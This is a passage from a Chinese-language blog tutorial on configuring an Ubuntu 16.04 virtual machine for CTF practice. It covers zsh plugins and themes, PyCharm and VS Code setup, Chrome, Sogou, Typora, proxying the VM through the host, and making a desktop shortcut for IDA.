<code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">➜  ~ <span class="token builtin class-name">source</span> ~/.zshrc<span class="token punctuation">[</span>oh-my-zsh<span class="token punctuation">]</span> plugin <span class="token string">'zsh-autosuggestions'</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是因为前面并没有把插件的代码仓库克隆到本地位置上，所以插件其实并没有被安装</p><p>将插件克隆到本地：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>问题即可解决</p><p>安装 <code>zsh-autosuggestions</code> 前：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA18.png" alt="Linux虚拟机CTF环境搭建18.png"></p><p>安装 <code>zsh-autosuggestions</code> 后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA20.png" alt="Linux虚拟机CTF环境搭建20.png"></p><p>灰色部分就是终端历史命令自动补全，与 Kali 终端一样</p><hr><h2 id="配置-zsh-syntax-highlighting"><a href="#配置-zsh-syntax-highlighting" class="headerlink" title="配置 zsh-syntax-highlighting"></a>配置 zsh-syntax-highlighting</h2><blockquote><p>语法高亮插件，当在终端输入命令时，这个插件可以帮助纠错，命令为红色代表错误，绿色代表正确</p></blockquote><p>方法和配置 <code>zsh-autosuggestions</code> 一样</p><p>通过 git 安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/oh-my-zsh/plugins<span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开 <code>zsh</code> 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜索 <code>plugins</code>，在 plugins 后面添加插件 <code>zsh-syntax-highlighting</code> （空格隔开）</p><p>并加入插件 <code>zsh-syntax-highlighting</code> 的默认保存地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git zsh-autosuggestions zsh-syntax-highlighting<span class="token punctuation">)</span><span class="token builtin class-name">source</span> /opt/oh-my-zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA12.png" alt="Ubuntu16.04虚拟机PWN环境搭建12.png"></p><p>将插件克隆到本地：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装 <code>zsh-syntax-highlighting</code> 后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA22.png" alt="Linux虚拟机CTF环境搭建22.png"></p><p>命令为绿色代表正确，红色代表输入错误</p><hr><h2 id="更换-ZSH-终端主题"><a href="#更换-ZSH-终端主题" class="headerlink" title="更换 ZSH 终端主题"></a>更换 ZSH 终端主题</h2><blockquote><p>zsh 终端自带很多不同风格的主题，可以根据自己的喜好更换</p></blockquote><p>查看 <code>zsh</code> 自带的主题：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/.oh-my-zsh/themes <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA24.png" alt="Linux虚拟机CTF环境搭建24.png"></p><p>打开 <code>zsh</code> 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜索 <code>ZSH_THEME</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA23.png" alt="Linux虚拟机CTF环境搭建23.png"></p><p>默认主题是 <code>robbyrussell</code>，可以根据个人喜好自行修改</p><p>如果设置为：<code>ZSH_THEME=&quot;random&quot;</code>，则每次打开终端时，主题都是随机的</p><p>如果不知道选哪个主题好，也可以先将主题设置为随机，然后每次打开 <code>zsh</code> 后都会显示：<br><code>[oh-my-zsh] Random theme &#39;xxx&#39; loaded</code><br>其中 <code>xxx</code> 就是该主题的名字，遇到喜欢的，就将其加到 <code>ZSH_THEME</code> 中</p><p>修改好后，更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以下主题样式可供参考：</p><ol><li><code>af-magic</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%981.png" alt="ZSH终端主题1.png"></p><ol start="2"><li><code>bira</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%982.png" alt="ZSH终端主题2.png"></p><ol start="3"><li><code>fox</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%983.png" alt="ZSH终端主题3.png"></p><ol start="4"><li><code>xiong-chiamiov</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%984.png" alt="ZSH终端主题4.png"></p><ol start="5"><li><code>gianu</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%985.png" alt="ZSH终端主题5.png"></p><blockquote><p>更多主题请查看：<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/themes#pygmalion">Themes · ohmyzsh&#x2F;ohmyzsh Wiki (github.com)</a></p></blockquote><hr><h2 id="切换-shell-终端"><a href="#切换-shell-终端" class="headerlink" title="切换 shell 终端"></a>切换 shell 终端</h2><p>查看系统已安装的 shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/shells<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前使用的 shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token environment constant">$SHELL</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>临时切换 shell：</li></ol><p>直接输入 shell 的名称即可，切换 zsh 就终端输入 zsh，切换 bash 就终端输入 bash</p><ol start="2"><li>永久切换 shell：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 将终端永久切换为 zsh</span><span class="token function">sudo</span> chsh <span class="token parameter variable">-s</span> /bin/zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h1 id="编辑器和-IDE"><a href="#编辑器和-IDE" class="headerlink" title="编辑器和 IDE"></a>编辑器和 IDE</h1><h2 id="安装-Pycharm-x2F-CLion"><a href="#安装-Pycharm-x2F-CLion" class="headerlink" title="安装 Pycharm&#x2F;CLion"></a>安装 Pycharm&#x2F;CLion</h2><blockquote><p>Ubuntu 16.04 的应用商店没有 Pycharm 和 CLion，只能自己通过安装包安装</p></blockquote><p>官网下载 Linux 版：<a href="https://www.jetbrains.com/pycharm/download/?section=linux">Download PyCharm: Python IDE for Professional Developers by JetBrains</a></p><p>以 pycharm-community-2021.3.3.tar.gz 为例（专业版同理）</p><p>解压并移动到 <code>/opt</code> 下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pycharm-community-2021.3.3.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> pycharm-community-2021.3.3 /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解压后进入 Pycharm 的 bin 目录，运行 Pycharm：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/pycharm-community-2021.3.3/bin<span class="token function">sudo</span> ./pycharm.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行软件后：<code>工具栏 –&gt; Tools –&gt; Create Desktop Entery</code> 可以创建桌面快捷方式，并将图标加入开始菜单</p><blockquote><p>如果不想用了，可以参照官方卸载方法：<a href="https://www.jetbrains.com/help/pycharm/uninstall.html">卸载 PyCharm | PyCharm 文档 (jetbrains.com)</a></p></blockquote><p>打开 Pycharm 后，如果界面显示异常，比如各种按键的方框显示不全：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA5.png" alt="Linux虚拟机CTF环境搭建5.png"></p><p><strong>一般虚拟机中的各种显示问题 bug，都和 VM 的 3D 图形加速有关</strong>，关掉即可正常显示：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA6.png" alt="Linux虚拟机CTF环境搭建6.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA7.png" alt="Linux虚拟机CTF环境搭建7.png"></p><hr><h2 id="安装-VScode"><a href="#安装-VScode" class="headerlink" title="安装 VScode"></a>安装 VScode</h2><blockquote><p>Ubuntu 16.04 的应用商店没有 VScode，只能自己通过安装包安装</p></blockquote><p>下载软件包：<a href="https://packages.microsoft.com/repos/vscode/pool/main/c/code/">Microsoft VScode</a></p><p>安装，以 code_1.74.2-1671533413_amd64.deb 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> code_1.74.2-1671533413_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装好后，如果 Ubuntu 16.04 设置了代理，在 VScode 中扩展会无法访问：<code>XHR failed</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA3.png" alt="Ubuntu16.04虚拟机PWN环境搭建3.png"></p><p>其实是整个 VScode 都无法连接网络，也无法登录账户同步</p><p>解决办法：</p><p>在 VScode 的设置中搜索 <code>proxy</code> （代理），找到 <code>Http：Proxy</code> 这一项</p><p>在 <code>Http：Proxy</code> 中填入 HTTP 代理的 IP 地址和端口号：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA5.png" alt="Ubuntu16.04虚拟机PWN环境搭建5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Ubuntu16.04%E8%99%9A%E6%8B%9F%E6%9C%BAPWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA4.png" alt="Ubuntu16.04虚拟机PWN环境搭建4.png"></p><p>刷新一下扩展，扩展访问正常</p><p>如果不使用代理，则同时关闭 Ubuntu 和 VScode 的代理设置</p><hr><h3 id="配置-C-x2F-C"><a href="#配置-C-x2F-C" class="headerlink" title="配置 C&#x2F;C++"></a>配置 C&#x2F;C++</h3><blockquote><p>首先要安装好 <code>gcc</code>、<code>g++</code>、<code>gdb</code> 环境</p></blockquote><p>安装 <code>C/C++</code> 和 <code>Code Runner</code> 插件</p><p>使用 VScode 调试：<br>新建 <code>.vscode</code> 文件夹，在 <code>.vscode</code> 文件夹下新建两个文件：<code>launch.json</code> 和 <code>tasks.json</code></p><p><strong>以后在其他的文件夹中要调试都要重建 <code>.vscode</code> 子文件夹并配置</strong></p><ul><li><code>launch.json</code> 内容：</li></ul><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"C/C++"</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"compile"</span><span class="token punctuation">,</span>            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Enable pretty-printing for gdb"</span><span class="token punctuation">,</span>                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">true</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>tasks.json</code> 内容：</li></ul><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"tasks"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>            <span class="token property">"label"</span><span class="token operator">:</span> <span class="token string">"compile"</span><span class="token punctuation">,</span>            <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"g++"</span><span class="token punctuation">,</span>   <span class="token comment">// c 文件为 gcc, cpp 文件为 g++</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"-g"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span>                <span class="token string">"-o"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"owner"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>                <span class="token property">"fileLocation"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                    <span class="token string">"relative"</span><span class="token punctuation">,</span>                    <span class="token string">"$&#123;workspaceRoot&#125;"</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token property">"pattern"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"regexp"</span><span class="token operator">:</span> <span class="token string">"^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$"</span><span class="token punctuation">,</span>                    <span class="token property">"file"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                    <span class="token property">"line"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                    <span class="token property">"column"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>                    <span class="token property">"severity"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>                    <span class="token property">"message"</span><span class="token operator">:</span> <span class="token number">5</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"group"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"build"</span><span class="token punctuation">,</span>                <span class="token property">"isDefault"</span><span class="token operator">:</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="配置-Python"><a href="#配置-Python" class="headerlink" title="配置 Python"></a>配置 Python</h3><blockquote><p>首先要安装好 <code>python</code> 环境</p></blockquote><p>安装插件 <code>Code Runner</code> 即可，其他插件：<code>Pylance</code>、<code>Python</code></p><p><code>Code Runner</code> 插件的代码运行指令可在 <code>扩展 -&gt; Code Runner -&gt; 扩展设置 -&gt; Code-runner: Executor Map -&gt; 在 settings.json 中编辑</code> 进行自定义</p><hr><h3 id="使用和一些问题"><a href="#使用和一些问题" class="headerlink" title="使用和一些问题"></a>使用和一些问题</h3><blockquote><p>如果是从 snap 商店安装的 VScode 可以直接使用，如果是自己通过 .deb 包安装，可能需要将 code 添加到环境变量</p></blockquote><p>从终端打开 VScode：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">code<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 VScode 创建文件并编辑： （类似于 VIM）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">code 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：<br><strong>在 VScode 中使用绝对路径一般没问题，但是使用相对路径 <code>./</code> 可能会出问题</strong><br>这并不是路径错了，而是 <em>VScode 默认的相对路径是针对 <code>.vscode</code> 文件夹所在的目录，而不是当前编辑的文件所在目录</em><br><em><code>.vscode</code> 文件夹默认放置在用户家目录下：<code>~/</code></em></p></blockquote><p>解决办法：</p><ul><li>打开 VScode 设置，在 <code>Code Runner</code> 插件中搜索：<code>File Directory As Cwd</code>，将下面的选项打上勾，重新打开编辑的文件，即可正常</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png" alt="Linux虚拟机CTF环境搭建2.png"></p><ul><li>如果不使用 <code>Code Runner</code>，而是直接使用 <code>Python</code> 插件，则在 <code>Python</code> 插件中搜索：<code>Execute ln File Dir</code>，将下面的选项打上勾，重新打开编辑的文件，即可正常</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA4.png" alt="Linux虚拟机CTF环境搭建4.png"></p><hr><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="安装-Chrome-浏览器"><a href="#安装-Chrome-浏览器" class="headerlink" title="安装 Chrome 浏览器"></a>安装 Chrome 浏览器</h2><blockquote><p>众所周知，“Chrome 是世界上最好的浏览器” （手动狗头）</p></blockquote><p>由于最新版的 Chrome 已经不支持 Ubuntu 16.04 了，因此需要自己下载旧版本的 deb 包进行安装</p><p>下载地址：<a href="https://www.chromedownloads.net/chrome64linux/">Chrome Downloads</a></p><p>下载后解压，直接安装 deb 包即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> google-chrome-stable_current_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果安装报错，说明版本不合适，请选择其他更旧的版本</p><p>推荐版本：<a href="https://www.chromedownloads.net/chrome64linux-stable/1266.html" title="chrome_linux64_stable_101.0.4951.54">chrome_linux64_stable_101.0.4951.54</a></p><hr><h2 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h2><p>下载 Linux 版搜狗输入法：<a href="http://cdn2.ime.sogou.com/dl/index/1571302197/sogoupinyin_2.3.1.0112_amd64.deb?st=EDsKarP7mjX2oPmtqBOCJA&e=1589200310&fn=sogoupinyin_2.3.1.0112_amd64.deb">sogoupinyin_2.3.1.0112_amd64.deb</a></p><p>以参考安装步骤中的 <code>sogoupinyin_2.3.1.0112_amd64.deb</code> 版本为主，使用太新的版本会导致 Ubuntu 重启后无法进入桌面</p><p>参考安装步骤：<a href="https://blog.csdn.net/weixin_44205779/article/details/107464267">【Ubuntu】Ubuntu16.04安装 搜狗输入法 史上最详细_ubuntu 16.04 安装搜狗输入法-CSDN博客</a></p><hr><h2 id="安装-Typora"><a href="#安装-Typora" class="headerlink" title="安装 Typora"></a>安装 Typora</h2><p>查看电脑架构：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-m</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载对应的 Typora 安装包：</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># x86(amd64)</span><span class="token function">wget</span> https://download2.typoraio.cn/linux/typora_1.6.6_amd64.deb --output-document typora.deb  <span class="token comment"># ARM</span><span class="token function">wget</span> https://download2.typoraio.cn/linux/typora_1.6.6_arm64.deb --output-document typora.deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  安装 Typora：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> typora.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="虚拟机代理"><a href="#虚拟机代理" class="headerlink" title="虚拟机代理"></a>虚拟机代理</h2><blockquote><p><strong>这里针对 Ubuntu 16.04 主要介绍虚拟机走主机代理的方法，也是比较推荐这种方法，因为简单方便</strong></p><p>如果想在 Ubuntu 16.04 安装 clash 请参考《Ubuntu22.04虚拟机PWN环境搭建》 （可能需要注意版本问题）</p></blockquote><p>将虚拟机网络模式设置为 NAT 或桥接模式 （两种方式物理机 IP 地址不一样，NAT 模式虚拟机走物理机的 VMnet8 虚拟网卡，桥接模式走物理机的 VMnet0 网卡）</p><p>这里以 NAT 模式为例，假设物理机 IP 为 192.168.148.1</p><hr><h3 id="通过-clash-走代理"><a href="#通过-clash-走代理" class="headerlink" title="通过 clash 走代理"></a>通过 clash 走代理</h3><p>物理机在 clash 主界面中打开“局域网代理”（Allow LAN），并查看代理端口，以 7890 为例</p><p>在虚拟机中按参数手动设置代理即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA12.png" alt="Linux虚拟机CTF环境搭建12.png"></p><hr><h3 id="通过-v2rayN-走代理"><a href="#通过-v2rayN-走代理" class="headerlink" title="通过 v2rayN 走代理"></a>通过 v2rayN 走代理</h3><p>物理机在 v2rayN 中打开：<code>设置 -&gt; 参数设置 -&gt; 允许来自局域网的连接</code></p><p>在 v2rayN 主界面中，查看局域网的 socks5 和 http 端口号：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA10.png" alt="Linux虚拟机CTF环境搭建10.png"></p><p>在虚拟机中按参数手动设置代理即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA11.png" alt="Linux虚拟机CTF环境搭建11.png"></p><hr><h2 id="创建桌面快捷方式并添加到开始菜单"><a href="#创建桌面快捷方式并添加到开始菜单" class="headerlink" title="创建桌面快捷方式并添加到开始菜单"></a>创建桌面快捷方式并添加到开始菜单</h2><blockquote><p>这里以 IDA Freeware 8.2 为例，因为我 Ubuntu 22.04 安装的是 IDA Freeware 8.2，但是 <strong>Ubuntu 16.04 貌似不支持这么新的版本，会无法运行，所以这里主要演示如何创建桌面快捷方式并添加到开始菜单，建议不要安装太高版本的 IDA</strong></p></blockquote><p>在桌面打开终端</p><p>新建一个 IDA-Freeware-8.2.desktop 文件： <em>（Ubuntu 16.04 安装 IDA 后会自动在桌面新建一个快捷方式，可以不用手动创建，这里主要演示如何创建桌面快捷方式并添加到开始菜单）</em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/桌面<span class="token function">sudo</span> <span class="token function">vim</span> IDA-Freeware-8.2.desktop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>并写入以下内容： （注意按照自己实际情况修改路径）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Version</span><span class="token operator">=</span><span class="token number">0.9</span>.4<span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Name</span><span class="token operator">=</span>IDA Freeware <span class="token number">8.2</span><span class="token assign-left variable">Comment</span><span class="token operator">=</span>Interactive Disassembler Freeware <span class="token number">8.2</span><span class="token assign-left variable">Icon</span><span class="token operator">=</span>/opt/idafree-8.2/appico64.png<span class="token assign-left variable">Exec</span><span class="token operator">=</span>/opt/idafree-8.2/ida64<span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">MimeType</span><span class="token operator">=</span>application/octet-stream<span class="token punctuation">;</span>application/mac-binary<span class="token punctuation">;</span>application/macbinary<span class="token punctuation">;</span>application/octet-stream<span class="token punctuation">;</span>application/x-binary<span class="token punctuation">;</span>application/x-macbinary<span class="token assign-left variable">StartupNotify</span><span class="token operator">=</span>true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">含义</th><th align="left">必要性</th></tr></thead><tbody><tr><td align="left"><code>[Desktop Entry]</code></td><td align="left">文件头，每个 